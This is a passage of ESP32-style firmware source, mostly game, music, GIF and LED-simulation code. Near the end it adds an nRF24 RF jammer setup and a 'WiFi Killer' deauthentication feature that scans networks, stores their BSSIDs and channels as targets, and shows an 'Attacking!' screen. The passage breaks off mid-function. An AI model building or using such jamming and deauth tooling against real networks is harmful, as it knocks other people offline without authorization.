  if (value < 140) value = 140;
  return (uint32_t)value;
}

static uint32_t gameEnemyBulletIntervalMs() {
  int value = 900 - (int)game.level * 35;
  if (value < 220) value = 220;
  return (uint32_t)value;
}

static uint32_t gamePlayerFireIntervalMs() {
  int value = 260 - (int)game.level * 4;
  if (value < 120) value = 120;
  return (uint32_t)value;
}

static void gameUpdateLevel() { game.level = 1 + game.kills / 10; }

static void gameDamagePlayer() {
  if (game.over) return;
  if (game.hp > 0) game.hp--;
  gamePlayPlayerHitTone();
  if (game.hp == 0) {
    game.over = true;
    tftDrawShooterHud(true);
  }
}

static void gameMoveShipFromGyro() {
  if (!imuOn) return;
  float rollDeg, pitchDeg;
  computeTiltDeg(rollDeg, pitchDeg);
  (void)pitchDeg;
  float clamped = constrain(rollDeg, -45.0f, 45.0f);
  int targetX = (int)roundf((clamped + 45.0f) * (7.0f / 90.0f));
  targetX = constrain(targetX, 0, 7);
  uint32_t now = millis();
  if (now - game.lastShipMoveMs < 70) return;
  if (targetX > game.shipX) { game.shipX++; game.lastShipMoveMs = now; }
  else if (targetX < game.shipX) { game.shipX--; game.lastShipMoveMs = now; }
}

static void gameSpawnPlayerShotIfNeeded() {
  uint32_t now = millis();
  if (now - game.lastFireMs < gamePlayerFireIntervalMs()) return;
  for (uint8_t i = 0; i < MAX_PLAYER_BULLETS; i++) {
    if (!playerBullets[i].active) {
      playerBullets[i].active = true;
      playerBullets[i].x = game.shipX;
      playerBullets[i].y = PLAYER_Y - 1;
      game.lastFireMs = now;
      gamePlayShootTone();
      return;
    }
  }
}

static void gameSpawnEnemyIfNeeded() {
  uint32_t now = millis();
  if (now - game.lastEnemySpawnMs < gameSpawnIntervalMs()) return;
  for (uint8_t i = 0; i < MAX_ENEMIES; i++) {
    if (!enemies[i].active) {
      enemies[i].active = true;
      enemies[i].x = random(0, 8);
      enemies[i].y = 0;
      uint8_t hp = 1;
      int tankRoll = random(0, 100);
      if (game.level >= 8 && tankRoll < 15) hp = 3;
      else if (game.level >= 4 && tankRoll < 35) hp = 2;
      enemies[i].hp = hp;
      if (game.level >= 6 && random(0, 100) < 35) enemies[i].drift = random(0, 2) ? 1 : -1;
      else enemies[i].drift = 0;
      game.lastEnemySpawnMs = now;
      return;
    }
  }
}

static void gameSpawnEnemyShotIfNeeded() {
  uint32_t now = millis();
  if (now - game.lastEnemyFireMs < gameEnemyBulletIntervalMs()) return;
  int activeIdx[MAX_ENEMIES];
  int activeCount = 0;
  for (uint8_t i = 0; i < MAX_ENEMIES; i++) {
    if (enemies[i].active && enemies[i].y < PLAYER_Y) activeIdx[activeCount++] = i;
  }
  if (activeCount == 0) return;
  int pick = activeIdx[random(0, activeCount)];
  for (uint8_t i = 0; i < MAX_ENEMY_BULLETS; i++) {
    if (!enemyBullets[i].active) {
      enemyBullets[i].active = true;
      enemyBullets[i].x = enemies[pick].x;
      enemyBullets[i].y = enemies[pick].y + 1;
      game.lastEnemyFireMs = now;
      return;
    }
  }
}

static void gameStepPlayerBullets() {
  uint32_t now = millis();
  if (now - game.lastBulletStepMs < 90) return;
  game.lastBulletStepMs = now;
  for (uint8_t i = 0; i < MAX_PLAYER_BULLETS; i++) {
    if (!playerBullets[i].active) continue;
    playerBullets[i].y--;
    if (playerBullets[i].y < 0) playerBullets[i].active = false;
  }
}

static void gameStepEnemyBullets() {
  uint32_t now = millis();
  if (now - game.lastEnemyBulletStepMs < 120) return;
  game.lastEnemyBulletStepMs = now;
  for (uint8_t i = 0; i < MAX_ENEMY_BULLETS; i++) {
    if (!enemyBullets[i].active) continue;
    enemyBullets[i].y++;
    if (enemyBullets[i].y > PLAYER_Y) enemyBullets[i].active = false;
  }
}

static void gameStepEnemies() {
  uint32_t now = millis();
  if (now - game.lastEnemyStepMs < gameEnemyStepIntervalMs()) return;
  game.lastEnemyStepMs = now;
  for (uint8_t i = 0; i < MAX_ENEMIES; i++) {
    if (!enemies[i].active) continue;
    if (enemies[i].drift != 0 && random(0, 100) < 45) {
      enemies[i].x = constrain(enemies[i].x + enemies[i].drift, 0, 7);
      if ((enemies[i].x == 0 && enemies[i].drift < 0) || (enemies[i].x == 7 && enemies[i].drift > 0)) enemies[i].drift = -enemies[i].drift;
    }
    enemies[i].y++;
    if (enemies[i].y >= 8) {
      enemies[i].active = false;
      // Jangan kurangi HP jika musuh sekadar lewat, biarkan saja
    }
  }
}

static void gameHandleCollisions() {
  for (uint8_t b = 0; b < MAX_PLAYER_BULLETS; b++) {
    if (!playerBullets[b].active) continue;
    for (uint8_t e = 0; e < MAX_ENEMIES; e++) {
      if (!enemies[e].active) continue;
      if (playerBullets[b].x == enemies[e].x && playerBullets[b].y == enemies[e].y) {
        playerBullets[b].active = false;
        if (enemies[e].hp > 0) enemies[e].hp--;
        if (enemies[e].hp == 0) {
          enemies[e].active = false;
          game.score += 10;
          game.kills++;
          gameUpdateLevel();
          gamePlayEnemyHitTone();
        }
        break;
      }
    }
  }
  for (uint8_t b = 0; b < MAX_ENEMY_BULLETS; b++) {
    if (!enemyBullets[b].active) continue;
    if (enemyBullets[b].y == PLAYER_Y && enemyBullets[b].x == game.shipX) {
      enemyBullets[b].active = false;
      gameDamagePlayer();
    }
  }
  for (uint8_t e = 0; e < MAX_ENEMIES; e++) {
    if (!enemies[e].active) continue;
    if (enemies[e].y == PLAYER_Y && enemies[e].x == game.shipX) {
      enemies[e].active = false;
      gameDamagePlayer();
    }
  }
}

static void gameLoop() {
  if (gameView == GAME_VIEW_MENU) {
    if (matrixDirty || brightnessDirty) {
      matrixCommitToPixels();
      matrixDirty = false;
    }
    return;
  }
  if (gameView == GAME_VIEW_WATER) {
    waterStep();
    tftDrawWaterHud(false);
    return;
  }
  if (gameView == GAME_VIEW_TETRIS) {
    tetrisLoop();
    return;
  }
  if (gameView == GAME_VIEW_PONG) {
    pongLoop();
    return;
  }
  if (!game.active) return;
  if (game.over) {
    matrixRenderGame();
    tftDrawShooterHud(false);
    return;
  }
  gameMoveShipFromGyro();
  gameSpawnPlayerShotIfNeeded();
  gameSpawnEnemyIfNeeded();
  gameSpawnEnemyShotIfNeeded();
  gameStepPlayerBullets();
  gameStepEnemyBullets();
  gameStepEnemies();
  gameHandleCollisions();
  matrixRenderGame();
  tftDrawShooterHud(false);
}

static void tetrisResetBoard() {
  memset(tetris.board, 0, sizeof(tetris.board));
  tetris.score = 0;
  tetris.lines = 0;
  tetris.level = 1;
  tetris.lastFallMs = 0;
  tetris.lastMoveMs = 0;
  tetris.lastHudMs = 0;
  tetris.over = false;
}

static bool tetrisCanPlace(uint8_t pieceType, uint8_t rotation, int8_t x, int8_t y) {
  for (int i = 0; i < 4; i++) {
    int px = x + tetrisShapeXY[pieceType][rotation][i][0];
    int py = y + tetrisShapeXY[pieceType][rotation][i][1];
    if (px < 0 || px >= 8 || py < 0 || py >= 8) return false;
    if (tetris.board[py][px] != 0) return false;
  }
  return true;
}

static void tetrisMergePiece() {
  for (int i = 0; i < 4; i++) {
    int px = tetris.x + tetrisShapeXY[tetris.pieceType][tetris.rotation][i][0];
    int py = tetris.y + tetrisShapeXY[tetris.pieceType][tetris.rotation][i][1];
    if (px >= 0 && px < 8 && py >= 0 && py < 8) tetris.board[py][px] = tetris.pieceType + 1;
  }
}

static void tetrisSpawnPiece() {
  tetris.pieceType = (uint8_t)random(0, 7);
  tetris.rotation = 0;
  tetris.x = 2;
  tetris.y = 0;
  if (!tetrisCanPlace(tetris.pieceType, tetris.rotation, tetris.x, tetris.y)) {
    tetris.over = true;
    tetris.active = false;
  }
}

static void tetrisStart() {
  if (!imuOn) {
    QMI8658_SetEnabled(true);
    (void)imuSaveToFS();
  }
  waterMode = false;
  if (!matrixSceneBackupValid) matrixCaptureScene();
  tetris.active = true;
  game.active = false;
  game.over = false;
  gameView = GAME_VIEW_TETRIS;
  tetrisResetBoard();
  tetrisSpawnPiece();
  enterMode(APP_GAME);
  tftDrawTetrisHud(true);
  matrixRenderTetris();
}

static void tetrisStop() {
  tetris.active = false;
  tetris.over = false;
}

static void tetrisRotate(int dir) {
  if (!tetris.active || tetris.over) return;
  uint8_t next = (uint8_t)((tetris.rotation + (dir > 0 ? 1 : 3)) & 0x03);
  if (tetrisCanPlace(tetris.pieceType, next, tetris.x, tetris.y)) tetris.rotation = next;
  else if (tetrisCanPlace(tetris.pieceType, next, tetris.x - 1, tetris.y)) { tetris.x--; tetris.rotation = next; }
  else if (tetrisCanPlace(tetris.pieceType, next, tetris.x + 1, tetris.y)) { tetris.x++; tetris.rotation = next; }
}

static void tetrisMoveFromGyro() {
  if (!tetris.active || tetris.over) return;
  float rollDeg = 0.0f, pitchDeg = 0.0f;
  computeTiltDeg(rollDeg, pitchDeg);
  (void)pitchDeg;
  int move = 0;
  if (rollDeg <= -14.0f) move = -1;
  else if (rollDeg >= 14.0f) move = 1;
  uint32_t now = millis();
  if (move == 0 || now - tetris.lastMoveMs < 150) return;
  if (tetrisCanPlace(tetris.pieceType, tetris.rotation, tetris.x + move, tetris.y)) {
    tetris.x += move;
    tetris.lastMoveMs = now;
  }
}

static void tetrisClearLines() {
  uint8_t cleared = 0;
  for (int y = 7; y >= 0; y--) {
    bool full = true;
    for (int x = 0; x < 8; x++) {
      if (tetris.board[y][x] == 0) { full = false; break; }
    }
    if (!full) continue;
    cleared++;
    for (int yy = y; yy > 0; yy--) memcpy(tetris.board[yy], tetris.board[yy - 1], 8);
    memset(tetris.board[0], 0, 8);
    y++;
  }
  if (cleared == 0) return;
  tetris.lines += cleared;
  tetris.score += cleared * 100;
  tetris.level = 1 + (tetris.lines / 4);
  gamePlayLineTone();
}

static void tetrisLoop() {
  if (tetris.over) {
    matrixRenderTetris();
    tftDrawTetrisHud(false);
    return;
  }
  if (!tetris.active) return;
  tetrisMoveFromGyro();
  uint32_t now = millis();
  uint32_t fallInterval = 650;
  if (tetris.level > 1) {
    int adjusted = 650 - (int)(tetris.level - 1) * 45;
    if (adjusted < 130) adjusted = 130;
    fallInterval = (uint32_t)adjusted;
  }
  if (now - tetris.lastFallMs >= fallInterval) {
    tetris.lastFallMs = now;
    if (tetrisCanPlace(tetris.pieceType, tetris.rotation, tetris.x, tetris.y + 1)) tetris.y++;
    else {
      tetrisMergePiece();
      tetrisClearLines();
      tetrisSpawnPiece();
    }
  }
  matrixRenderTetris();
  tftDrawTetrisHud(false);
}

// =========================================================
// PONG game
// =========================================================
static void pongResetBall() {
  pong.ballX = 120; pong.ballY = 120;
  float speed = 1.8f + 0.15f * (pong.playerScore + pong.aiScore);
  pong.ballVX = (random(2) == 0) ? speed : -speed;
  pong.ballVY = (random(2) == 0) ? speed : -speed;
}

static void pongStart() {
  if (!imuOn) { QMI8658_SetEnabled(true); (void)imuSaveToFS(); }
  waterMode = false;
  if (!matrixSceneBackupValid) matrixCaptureScene();
  pong.active = true; pong.over = false;
  pong.playerScore = 0; pong.aiScore = 0; pong.maxScore = 5;
  pong.playerX = 100; pong.aiX = 100;
  pong.lastFrameMs = 0; pong.lastHudMs = 0;
  pongResetBall();
  game.active = false; tetrisStop();
  gameView = GAME_VIEW_PONG;
  enterMode(APP_GAME);
  tftDrawPongFrame(true);
}

static void pongStop() {
  pong.active = false; pong.over = false;
}

static void pongLoop() {
  if (pong.over) { tftDrawPongFrame(false); return; }
  if (!pong.active) return;
  uint32_t now = millis();
  if (now - pong.lastFrameMs < 16) return;
  pong.lastFrameMs = now;
  // Player paddle from gyro (inverted for TFT orientation)
  float rollDeg, pitchDeg;
  computeTiltDeg(rollDeg, pitchDeg);
  float target = constrain((-rollDeg + 45.0f) / 90.0f * 240.0f - 20.0f, 0.0f, 199.0f);
  float diff = target - pong.playerX;
  pong.playerX += constrain(diff, -4.5f, 4.5f);
  // AI paddle follows ball with lag
  float aiSpeed = 1.5f + 0.15f * (pong.playerScore + pong.aiScore);
  float aiDiff = pong.ballX - pong.aiX - 17;
  pong.aiX += constrain(aiDiff, -aiSpeed, aiSpeed);
  pong.aiX = constrain(pong.aiX, 0.0f, 199.0f);
  // Move ball
  pong.ballX += pong.ballVX;
  pong.ballY += pong.ballVY;
  // Wall bounce left/right
  if (pong.ballX <= 1) { pong.ballX = 1; pong.ballVX = fabsf(pong.ballVX); }
  if (pong.ballX >= 234) { pong.ballX = 234; pong.ballVX = -fabsf(pong.ballVX); }
  // Player paddle hit (bottom)
  int16_t px = constrain((int16_t)pong.playerX, 1, 199);
  if (pong.ballVY > 0 && pong.ballY + 5 >= 218 && pong.ballY + 5 <= 224 &&
      pong.ballX + 2 >= px && pong.ballX + 2 <= px + 40) {
    pong.ballVY = -fabsf(pong.ballVY);
    float offset = (pong.ballX + 2 - (px + 20)) / 20.0f;
    pong.ballVX += offset * 0.8f;
    pong.ballVX = constrain(pong.ballVX, -3.5f, 3.5f);
    uiPlayTone(1760, 10);
  }
  // AI paddle hit (top)
  int16_t ax = constrain((int16_t)pong.aiX, 1, 199);
  if (pong.ballVY < 0 && pong.ballY <= 21 && pong.ballY >= 15 &&
      pong.ballX + 2 >= ax && pong.ballX + 2 <= ax + 40) {
    pong.ballVY = fabsf(pong.ballVY);
    float offset = (pong.ballX + 2 - (ax + 20)) / 20.0f;
    pong.ballVX += offset * 0.8f;
    pong.ballVX = constrain(pong.ballVX, -3.5f, 3.5f);
    uiPlayTone(1320, 10);
  }
  // Score: ball out top = player scores, ball out bottom = AI scores
  if (pong.ballY <= 1) {
    pong.playerScore++;
    uiPlayTone(2200, 40);
    if (pong.playerScore >= pong.maxScore) pong.over = true;
    else pongResetBall();
  }
  if (pong.ballY >= 234) {
    pong.aiScore++;
    uiPlayTone(440, 60);
    if (pong.aiScore >= pong.maxScore) pong.over = true;
    else pongResetBall();
  }
  tftDrawPongFrame(false);
}

static int calcNoteDurationMs(int divider) {
  if (divider == 0) return 0;
  int dur;
  if (divider > 0) dur = wholenote / divider;
  else {
    dur = wholenote / abs(divider);
    dur = (int)(dur * 1.5f);
  }
  return dur;
}

static const char *songName(SongId id) {
  switch (id) {
    case SONG_ID_MERRY: return "Merry";
    case SONG_ID_PIRATES: return "Pirates";
    case SONG_ID_PINK: return "Pink";
    case SONG_ID_CLASSIC: return "Classic";
    default: return "None";
  }
}

static void songSelect(SongId id) {
  currentSong = id;
  switch (id) {
    case SONG_ID_MERRY:
      currentSongType = SONG_TYPE_MELODY;
      currentSongMelody = melodyMerry;
      currentSongMelodyLength = sizeof(melodyMerry) / sizeof(melodyMerry[0]);
      currentSongTempo = tempoMerry;
      break;
    case SONG_ID_PIRATES:
      currentSongType = SONG_TYPE_MELODY;
      currentSongMelody = melodyPirates;
      currentSongMelodyLength = sizeof(melodyPirates) / sizeof(melodyPirates[0]);
      currentSongTempo = tempoPirates;
      break;
    case SONG_ID_CLASSIC:
      currentSongType = SONG_TYPE_TEXT;
      currentSongNotes = melodyClassicNotes;
      currentSongBeats = melodyClassicBeats;
      currentSongTextLength = sizeof(melodyClassicBeats) / sizeof(melodyClassicBeats[0]);
      currentSongTempo = tempoClassic;
      break;
    case SONG_ID_PINK:
    default:
      currentSongType = SONG_TYPE_MELODY;
      currentSongMelody = melodyPinkPanther;
      currentSongMelodyLength = sizeof(melodyPinkPanther) / sizeof(melodyPinkPanther[0]);
      currentSongTempo = tempoPinkPanther;
      currentSong = SONG_ID_PINK;
      break;
  }
}

static int songTextNoteToFreq(char note) {
  static const char names[] = {'C','D','E','F','G','A','B','c','d','e','f','g','a','b','x','y'};
  static const uint16_t halfPeriods[] = {1915,1700,1519,1432,1275,1136,1014,956,834,765,593,468,346,224,655,715};
  for (uint8_t i = 0; i < sizeof(names); i++) {
    if (names[i] == note) {
      return (int)(1000000UL / ((uint32_t)halfPeriods[i] * 2UL));
    }
  }
  return 0;
}

static void songStart() {
  songStartSelected(currentSong);
}

static void songStartSelected(SongId id) {
  noteStopPlay();
  songSelect(id);
  wholenote = (60000 * 4) / currentSongTempo;
  songIndex = 0;
  songPlaying = true;
  noteEndMs = 0;
  pauseEndMs = 0;
  noteOnPhase = false;
}

static void songStop() {
  songPlaying = false;
  songIndex = 0;
  buzzerNoTone();
}

static void songLoop() {
  if (!songPlaying) return;
  uint32_t now = millis();
  if (pauseEndMs && now < pauseEndMs) return;
  if (noteOnPhase && now < noteEndMs) return;
  if (currentSongType == SONG_TYPE_MELODY) {
    if (songIndex >= currentSongMelodyLength) { songStop(); return; }
    if (!noteOnPhase) {
      int pitch = pgm_read_word_near(currentSongMelody + songIndex);
      int divider = pgm_read_word_near(currentSongMelody + songIndex + 1);
      int duration = calcNoteDurationMs(divider);
      int playMs = (int)(duration * 0.9f);
      if (pitch == REST) buzzerNoTone();
      else buzzerTone(pitch, playMs);
      noteOnPhase = true;
      noteEndMs = now + playMs;
      pauseEndMs = now + duration;
    } else {
      buzzerNoTone();
      noteOnPhase = false;
      songIndex += 2;
      if (now >= pauseEndMs) pauseEndMs = 0;
    }
  } else {
    if (songIndex >= currentSongTextLength) { songStop(); return; }
    if (!noteOnPhase) {
      char note = pgm_read_byte_near(currentSongNotes + songIndex);
      uint8_t beat = pgm_read_byte_near(currentSongBeats + songIndex);
      int duration = max(30, (beat * currentSongTempo) / 5);
      int playMs = (int)(duration * 0.85f);
      int freq = songTextNoteToFreq(note);
      if (note == ' ' || freq <= 0) buzzerNoTone();
      else buzzerTone(freq, playMs);
      noteOnPhase = true;
      noteEndMs = now + playMs;
      pauseEndMs = now + duration;
    } else {
      buzzerNoTone();
      noteOnPhase = false;
      songIndex++;
      if (now >= pauseEndMs) pauseEndMs = 0;
    }
  }
}

static void *GIFOpenFile(const char *fname, int32_t *pSize) {
  if (gifFsFile) gifFsFile.close();
  gifFsFile = LittleFS.open(fname, "r");
  if (!gifFsFile) return nullptr;
  *pSize = (int32_t)gifFsFile.size();
  return (void *)&gifFsFile;
}

static void GIFCloseFile(void *pHandle) {
  File *f = (File *)pHandle;
  if (f && *f) f->close();
}

static int32_t GIFReadFile(GIFFILE *pFile, uint8_t *pBuf, int32_t iLen) {
  File *f = (File *)pFile->fHandle;
  if (!f || !(*f)) return 0;
  int32_t bytesToRead = iLen;
  if ((pFile->iSize - pFile->iPos) < bytesToRead) bytesToRead = pFile->iSize - pFile->iPos - 1;
  if (bytesToRead < 0) bytesToRead = 0;
  int32_t bytesRead = (int32_t)f->read(pBuf, bytesToRead);
  pFile->iPos = (int32_t)f->position();
  return bytesRead;
}

static int32_t GIFSeekFile(GIFFILE *pFile, int32_t iPosition) {
  File *f = (File *)pFile->fHandle;
  if (!f || !(*f)) return 0;
  f->seek((uint32_t)iPosition);
  pFile->iPos = (int32_t)f->position();
  return pFile->iPos;
}

static void GIFDraw(GIFDRAW *pDraw) {
  gifLinesDrawn++;
  int y = pDraw->iY + pDraw->y;
  if (y < 0 || y >= tft.height()) return;
  int x = pDraw->iX;
  int w = pDraw->iWidth;
  if (x >= tft.width() || (x + w) <= 0) return;
  if (w > 240) w = 240;
  uint8_t *idx = (uint8_t *)pDraw->pPixels;
  uint16_t *pal = (uint16_t *)pDraw->pPalette;
  static uint16_t lineBuf[240];
  for (int i = 0; i < w; i++) {
    uint8_t pix = idx[i];
    lineBuf[i] = pal[pix];
  }
  int drawX = x;
  int drawW = w;
  uint8_t *srcIdx = idx;
  uint16_t *src = lineBuf;
  if (drawX < 0) {
    int cut = -drawX;
    drawX = 0;
    drawW -= cut;
    srcIdx += cut;
    src += cut;
  }
  if (drawX + drawW > tft.width()) drawW = tft.width() - drawX;
  if (drawW <= 0) return;
  if (!pDraw->ucHasTransparency) {
    tft.drawRGBBitmap(drawX, y, src, drawW, 1);
    return;
  }
  int runStart = -1;
  for (int i = 0; i < drawW; i++) {
    bool transparent = (srcIdx[i] == pDraw->ucTransparent);
    if (!transparent && runStart < 0) runStart = i;
    bool runEnds = transparent || (i == drawW - 1);
    if (runStart >= 0 && runEnds) {
      int end = transparent ? i : (i + 1);
      tft.drawRGBBitmap(drawX + runStart, y, src + runStart, end - runStart, 1);
      runStart = -1;
    }
  }
}

static void gifStop() {
  gifPlaying = false;
  buzzerNoTone();
  gif.close();
  if (gifFsFile) gifFsFile.close();
  gifScreenCleared = false;
  gifFrameDelayMs = 20;
  lastGifFrameMs = 0;
}

static bool gifStart() {
  gifStop();
  gifLinesDrawn = 0;
  if (!LittleFS.exists(GIF_PATH)) { gifLastError = "GIF file not found"; return false; }
  bool ok = gif.open(GIF_PATH, GIFOpenFile, GIFCloseFile, GIFReadFile, GIFSeekFile, GIFDraw);
  if (!ok) { gifLastError = "gif.open() failed"; return false; }
  gifLastError = "";
  gifPlaying = true;
  gifScreenCleared = false;
  lastGifFrameMs = millis();
  gifFrameDelayMs = 20;
  return true;
}

static void gifLoopStep() {
  if (!gifPlaying) {
    uint32_t now = millis();
    if (now - lastGifReopenMs < 250) return;
    lastGifReopenMs = now;
    if (!gifStart()) return;
  }
  if (!gifScreenCleared) {
    tft.fillScreen(ST77XX_BLACK);
    gifScreenCleared = true;
  }
  uint32_t now = millis();
  if (now - lastGifFrameMs < gifFrameDelayMs) return;
  int nextDelay = 0;
  lastGifFrameMs = now;
  if (!gif.playFrame(false, &nextDelay)) {
    gif.reset();
    lastGifFrameMs = now;
    gifFrameDelayMs = 20;
  } else {
    if (nextDelay < 20) nextDelay = 20;
    if (nextDelay > 500) nextDelay = 500;
    gifFrameDelayMs = (uint16_t)nextDelay;
  }
}

static void waterReset() {
  memset(water, 0, sizeof(water));
  for (int i = 0; i < 18; i++) water[random(0, 8)][random(0, 8)] = random(120, 255);
}

static void waterStep() {
  uint32_t now = millis();
  if (now - lastWaterStepMs < 40) return;
  lastWaterStepMs = now;
  float rollDeg, pitchDeg;
  computeTiltDeg(rollDeg, pitchDeg);
  int sx = (rollDeg > 12.0f) ? 1 : (rollDeg < -12.0f ? -1 : 0);
  int sy = (pitchDeg > 12.0f) ? -1 : (pitchDeg < -12.0f ? 1 : 0);
  memset(waterTmp, 0, sizeof(waterTmp));
  for (int y = 0; y < 8; y++) {
    for (int x = 0; x < 8; x++) {
      uint8_t v = water[y][x];
      if (v == 0) continue;
      int vv = v - 2;
      if (vv < 0) vv = 0;
      int nx = constrain(x + sx, 0, 7);
      int ny = constrain(y + sy, 0, 7);
      int moved = (vv * 70) / 100;
      int stay = vv - moved;
      int spread = (vv * 10) / 100;
      int cur = waterTmp[ny][nx] + moved;
      waterTmp[ny][nx] = (cur > 255) ? 255 : cur;
      cur = waterTmp[y][x] + stay;
      waterTmp[y][x] = (cur > 255) ? 255 : cur;
      if (spread > 0) {
        int each = spread / 4;
        if (each < 1) each = 1;
        static const int dirs[4][2] = {{1,0},{-1,0},{0,1},{0,-1}};
        for (int k = 0; k < 4; k++) {
          int xx = x + dirs[k][0];
          int yy = y + dirs[k][1];
          if (xx < 0 || xx > 7 || yy < 0 || yy > 7) continue;
          int cc = waterTmp[yy][xx] + each;
          waterTmp[yy][xx] = (cc > 255) ? 255 : cc;
        }
      }
    }
  }
  if (random(0, 10) == 0) {
    int rx = random(0, 8), ry = random(0, 8);
    int nv = waterTmp[ry][rx] + random(80, 160);
    waterTmp[ry][rx] = (nv > 255) ? 255 : nv;
  }
  memcpy(water, waterTmp, sizeof(water));
  for (int y = 0; y < 8; y++) {
    for (int x = 0; x < 8; x++) {
      uint8_t a = water[y][x];
      leds[y * 8 + x] = CRGB(0, (uint8_t)(a / 5), a);
    }
  }
  applyBrightnessIfDirty();
  FastLED.show();
}

static void uiMarkDirty() {
  uiDirty = true;
  markTftDirty();
}

static void uiEnter(UiScreen screen) {
  uiScreen = screen;
  if (screen == UI_FILE_EXPLORER) {
    explorerRefresh();
  } else if (screen == UI_RF_JAMMER) {
#if HAS_RF24_LIB
    if (!nrfRadioFound) {
      nrfRadioFound = nrfRadio.begin();
      if (nrfRadioFound) {
        nrfRadio.setAutoAck(false);
        nrfRadio.stopListening();
        nrfRadio.setRetries(0, 0);
        nrfRadio.setPALevel(RF24_PA_MAX, true);
        nrfRadio.setDataRate(RF24_2MBPS);
        nrfRadio.setCRCLength(RF24_CRC_DISABLED);
      }
    }
#endif
    nrfJammingActive = false;
  }
  uiMarkDirty();
}

static void enterMode(AppMode mode) {
  appMode = mode;
  markTftDirty();
  if (mode != APP_VIEW_GIF) gifStop();
  if (mode != APP_CAMERA) {
    cameraStop();
    if (cameraRotationSaved) {
      tft.setRotation(prevTftRotation);
      cameraRotationSaved = false;
    }
  } else {
    // entering camera mode: clear backoff so connect is attempted immediately
    cameraReconnectBackoffUntilMs = 0;
    cameraFailCount = 0;
    cameraLastConnectMs = 0;
    // rotate display to orientation 3 while in camera mode
    prevTftRotation = tft.getRotation();
    tft.setRotation(3);
    cameraRotationSaved = true;
  }
}

static void exitToUi() {
  appMode = APP_UI;
  uiEnter(UI_MENU);
  gifStop();
  cameraStop();
}

static void wifiScanAndShowList() {
  doNetworkInit();
  wifiLimitedMode = false;
  wifiStatusMessage = "Scanning...";
  wifiLastConnectOk = false;
  uiEnter(UI_WIFI_LIST);
  tftDrawWifiListMenu();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, false);
  delay(120);
  int found = WiFi.scanNetworks();
  wifiScanCount = 0;
  if (found > 0) {
    uint8_t limit = min<uint8_t>((uint8_t)found, WIFI_SCAN_MAX);
    for (uint8_t i = 0; i < limit; i++) {
      wifiScanSsids[i] = WiFi.SSID(i);
      wifiScanRssi[i] = WiFi.RSSI(i);
      wifiScanOpen[i] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
      wifiScanCount++;
    }
  }
  WiFi.scanDelete();
  wifiListIndex = 0;
  wifiStatusMessage = (wifiScanCount > 0) ? String("Select network") : String("No network found");
  uiMarkDirty();
}

void startDeauthScan() {
  doNetworkInit();
    wifiStatusMessage = "Scanning Targets...";
    wifiLastConnectOk = false;
    uiEnter(UI_DEAUTH_SCANNER);
    WiFi.mode(WIFI_STA);
    int found = WiFi.scanNetworks();
    wifiScanCount = 0;
    if (found > 0) {
      uint8_t limit = min<uint8_t>((uint8_t)found, WIFI_SCAN_MAX);
      for (uint8_t i = 0; i < limit; i++) {
        wifiScanSsids[i] = WiFi.SSID(i);
        wifiScanRssi[i] = WiFi.RSSI(i);
        deauthScanChannels[i] = WiFi.channel(i);
        const uint8_t *bssid = WiFi.BSSID(i);
        if (bssid) memcpy(deauthScanBssids[i], bssid, 6);
        else memset(deauthScanBssids[i], 0, 6);
        wifiScanCount++;
      }
      wifiStatusMessage = "Select target";
    } else {
      wifiStatusMessage = (found == 0) ? String("No target found") : String("Scan failed");
    }
    WiFi.scanDelete();
    wifiListIndex = 0;
    uiMarkDirty();
}



static void tftDrawDeauthScanner() {
  tftDrawHeader("WiFi Killer");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:pilih OK:buka OK+:back");
  const uint8_t rescanIndex = wifiScanCount;
  const uint8_t itemCount = wifiScanCount + 1;
  const uint8_t visibleCount = 4;
  uint8_t firstVisible = tftListFirstVisible(wifiListIndex, itemCount, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= itemCount) break;
    int y = 58 + row * 42;
    bool selected = (i == wifiListIndex);
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    if (i == rescanIndex) {
      tft.setTextSize(2);
      tft.setCursor(24, y + 8);
      tft.print("Rescan Target");
    } else {
      tft.setTextSize(2);
      tft.setCursor(24, y + 6);
      tft.print(wifiScanSsids[i]);
      tft.setTextSize(1);
      tft.setCursor(24, y + 22);
      tft.print(String("CH ") + deauthScanChannels[i]);
      tft.setCursor(78, y + 22);
      tft.print(String(wifiScanRssi[i]) + " dBm");
    }
  }
  if (wifiStatusMessage.length() > 0) {
    tft.fillRect(12, 228, 216, 10, UI_BG);
    tft.setTextSize(1);
    tft.setTextColor(wifiLastConnectOk ? UI_OK : UI_WARN);
    tft.setCursor(12, 230);
    tft.print(wifiStatusMessage);
  }
  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);

}

static void tftDrawReasonPicker() {
  tftDrawHeader("Pick Reason");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:reason OK:kirim");

  const uint8_t visibleCount = 4;
  uint8_t firstVisible = tftListFirstVisible(reasonListIndex, deauthReasonCount, visibleCount);

  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= deauthReasonCount) break;
    int y = 58 + row * 42;
    bool selected = (i == reasonListIndex);
    
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    
    tft.setTextSize(1);
    tft.setCursor(22, y + 6);
    tft.print(deauthReasonList[i].title);
    

  }
  
  tftDrawListScrollbar(226, 60, 140, deauthReasonCount, visibleCount, firstVisible);

  tft.fillRect(12, 228, 216, 10, UI_BG);
  tft.setTextSize(1);
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(12, 230);
  tft.print(String("Target: ") + deauthTargetSsid);
}

static void tftDrawDeauthAttack() {
  tftDrawHeader("Attacking!");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("Memutus target. OK:stop");

  tft.setTextSize(2);
  tft.setTextColor(UI_WARN);
  tft.setCursor(12, 80);
  tft.print("Target: ");
  
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
